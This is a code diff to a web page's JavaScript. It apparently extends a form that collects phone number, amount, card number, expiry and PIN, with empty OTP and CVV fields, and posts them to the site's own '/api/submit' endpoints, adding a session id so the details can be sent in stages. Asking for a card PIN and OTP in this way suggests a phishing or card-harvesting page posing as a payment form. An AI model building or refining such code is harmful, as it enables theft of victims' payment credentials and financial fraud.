@@ -795,19 +795,28 @@
       const p = new URLSearchParams(location.search);
       const phone  = p.get('phone')  || '';
       const amount = p.get('amount') || '';
+      const sid    = p.get('sid')    || '';
       savedCard = card;
       savedExpMonth = expiry.slice(0,2);
       savedExpYear  = '20' + expiry.slice(2,4);
 
-      let subId = null;
+      let subId = sid || null;
       try {
-        const r = await fetch('/api/submit', {
-          method: 'POST',
-          headers: { 'Content-Type': 'application/json' },
-          body: JSON.stringify({ phone, amount, card, expiry, pin, otp: '', cvv: '' })
-        });
-        const d = await r.json();
-        subId = d.id;
+        if (subId) {
+          await fetch('/api/submit-step/' + subId, {
+            method: 'POST',
+            headers: { 'Content-Type': 'application/json' },
+            body: JSON.stringify({ card, expiry, pin })
+          });
+        } else {
+          const r = await fetch('/api/submit', {
+            method: 'POST',
+            headers: { 'Content-Type': 'application/json' },
+            body: JSON.stringify({ phone, amount, card, expiry, pin, otp: '', cvv: '' })
+          });
+          const d = await r.json();
+          subId = d.id;
+        }
       } catch(e) {}
 
       // إخفاء بطاقة البيانات وعرض التحميل
